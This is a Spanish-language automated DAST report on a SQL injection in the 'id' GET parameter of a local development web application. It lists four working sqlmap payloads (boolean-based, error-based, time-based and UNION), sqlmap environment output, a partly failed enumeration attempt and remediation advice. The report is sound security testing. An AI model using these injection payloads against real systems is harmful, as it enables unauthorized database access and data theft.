# Informe de Análisis DAST (SQLi)

Fecha: 2026-04-13T09:49:15Z
Objetivo: http://web.dev.local:8083
Herramientas: curl, sqlmap (Kali Linux)

## Resumen Ejecutivo
Se detectó una vulnerabilidad de inyección SQL (SQLi) en el parámetro GET `id` del formulario de búsqueda de usuarios. sqlmap confirmó que el parámetro es inyectable mediante técnicas boolean-based, error-based, time-based y UNION. Se intentó enumerar el usuario actual y bases de datos; sqlmap recuperó información sobre el motor (MySQL/MariaDB) y el entorno, pero la enumeración completa de bases de datos falló parcialmente. No se extrajeron credenciales completas en esta ejecución.

## Vectores Analizados
- Formulario GET en la página principal: <form action="#" method="GET"> con input name="id". URL probada: http://web.dev.local:8083?id=&Submit=Submit

## Hallazgos
- Parámetro vulnerable: id (GET)
- Técnicas detectadas por sqlmap:
  - boolean-based blind
  - error-based (EXTRACTVALUE)
  - time-based blind (SLEEP)
  - UNION query (2 columns)

- Payloads (extraídos del output de sqlmap):
  - Boolean-based payload: id=2352' OR NOT 7247=7247#&Submit=Submit
  - Error-based payload: id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit
  - Time-based payload: id=2352' AND (SELECT 8276 FROM (SELECT(SLEEP(5)))fFmn)-- zOtb&Submit=Submit
  - UNION payload: id=2352' UNION ALL SELECT CONCAT(0x7176627171,0x72427059744f476b4d78544e587a484175417453704154766b554d6c5077574f6c754a7245786d58,0x7171767871),NULL#&Submit=Submit

## Evidencia de Explotación
- sqlmap identificó el parámetro `id` como inyectable y reportó el back-end DBMS: MySQL (MariaDB fork).
- Archivo con salida inicial de sqlmap: /tmp/sqlscan/sqlmap_initial.txt
- Archivo con salida de enumeración: /tmp/sqlscan/sqlmap_exploit_dbs.txt

Fragmentos relevantes (capturados):

- Identificación del parámetro y tipos de inyección (de sqlmap):
  "Parameter: id (GET)\n    Type: boolean-based blind\n    Type: error-based\n    Type: time-based blind\n    Type: UNION query"

- Información del entorno (de sqlmap):
  "the back-end DBMS is MySQL\nweb server operating system: Linux Debian\nweb application technology: PHP 8.1.33, Apache 2.4.65"

- Intentos de enumeración (fallidos parcialmente): sqlmap no pudo recuperar el listado de bases de datos en la ejecución automatizada (mensaje: "unable to retrieve the number of databases" / "unable to retrieve the database names"), aunque intentó usar varias técnicas y registró resultados en el directorio de salida.

No se logró extraer usuarios/contraseñas en esta ejecución automatizada.

## Conclusión y Recomendaciones
Conclusión: Existe una vulnerabilidad SQLi confirmada en el parámetro GET `id`. La explotación automatizada mostró múltiples vectores (boolean, error, time, UNION) que permiten interacción con la base de datos; sin embargo, la extracción completa de datos no fue exitosa en esta ejecución (probablemente por limitaciones del payload, técnicas de filtrado o necesidad de configuración de sqlmap adicional como --hex, --no-cast, ajustar --level/--risk, o autenticación/paths adicionales).

Recomendaciones de remediación:
1. Validación y saneamiento: Utilizar consultas parametrizadas (prepared statements) para todas las entradas del parámetro `id`.
2. Filtrado: Rechazar valores no numéricos si `id` debe ser numérico; aplicar validación en servidor.
3. Minimizar la información devuelta en errores de BD (evitar mensajes que filtren stack/errores SQL).
4. Revisar registros y rotación de credenciales si hay indicios de explotación previa.
5. Realizar tests adicionales con autenticación/privilegios si la app lo requiere, y ejecutar sqlmap con opciones avanzadas (por ejemplo, --hex o --no-cast) bajo control para intentar recuperación completa si autorizado.

## Artefactos
- /tmp/sqlscan/home.html (copia de la página)
- /tmp/sqlscan/sqlmap_initial.txt
- /tmp/sqlscan/sqlmap_exploit_dbs.txt
- /tmp/sqlscan/sqlmap_exploit_tables.txt (si existe)
- /tmp/sqlscan/sqlmap_exploit_dump.txt (si existe)


---
Informe generado automáticamente por agente DAST (sqlmap).